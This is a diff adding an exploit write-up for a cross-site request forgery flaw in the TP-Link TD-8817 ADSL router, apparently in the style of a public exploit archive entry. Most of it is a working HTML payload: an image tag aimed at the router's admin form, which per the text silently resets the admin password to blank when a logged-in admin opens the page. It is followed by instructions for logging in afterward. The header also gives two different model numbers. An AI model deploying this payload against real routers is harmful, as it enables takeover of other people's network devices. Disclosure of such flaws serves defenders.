@@ -1,0 +1,36 @@
+######################################################################
+# Exploit Title: TP-Link TD-8817 CSRF Vulnerability 
+# Author: Un0wn_X
+# E-mail: unownsec@gmail.com
+# Category: Hardware
+# Google Dork: N/A
+# Vendor: http://www.tp-link.com
+# Version: TD-W8901G
+# Firmware Version: 6.0.1 Build 111128 Rel.26763
+# Product: http://www.tp-link.com/lk/products/details/?model=TD-8817
+# Tested on: Windows 7 64-bit
+# PoC video: http://www.youtube.com/watch?v=8xJGkRQB0QM
+######################################################################
+
+#Introduction
+==============
+TP-Link TD-8817 is a ADSL2+ Ethernet/USB Modem Router which works with a 24-Mbps  downstream connection.
+
+#Description of Vulnerability
+=============================
+You can easily change the default user's (admin) password by the default router page listning on tcp/ip port 80. In here you the $_GET will change the password for you and the $_POST request method is not needed for changing the router pass.
+
+#Exploit
+========
+
+<html>
+<!-- TP-Link TD-8817 CSRF Exploit -->
+<body>
+<img src="http://192.168.1.1/Forms/tools_admin_1"/>
+</body>
+</html>
+
+==========
+Save this as csrf.html and this will change the router password to blank if the current user admin visits this page his password will be resetted to blank. You can login with the username admin and password (blank).
+
+#Greetz to G2, Zer0Freak, HR aka MrGreen, Divine, Keeper, SubZer0, zer0time, Zer0wl, Cyb_iDioT, Prominent, Raw-x, Kasper, D3ADSH0T 
